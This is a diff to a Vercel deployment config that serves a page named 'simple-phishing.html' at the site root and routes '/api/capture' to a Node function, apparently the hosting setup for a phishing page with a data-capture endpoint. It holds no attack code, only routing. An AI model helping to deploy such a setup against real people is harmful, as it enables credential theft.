@@ -1,6 +1,17 @@
 {
-  "rewrites": [
-    { "source": "/", "destination": "/simple-phishing.html" },
-    { "source": "/api/capture", "destination": "/api/capture.js" }
+  "version": 2,
+  "builds": [
+    {
+      "src": "simple-phishing.html",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "api/capture.js",
+      "use": "@vercel/node"
+    }
+  ],
+  "routes": [
+    { "src": "/", "dest": "/simple-phishing.html" },
+    { "src": "/api/capture", "dest": "/api/capture.js" }
   ]
 }
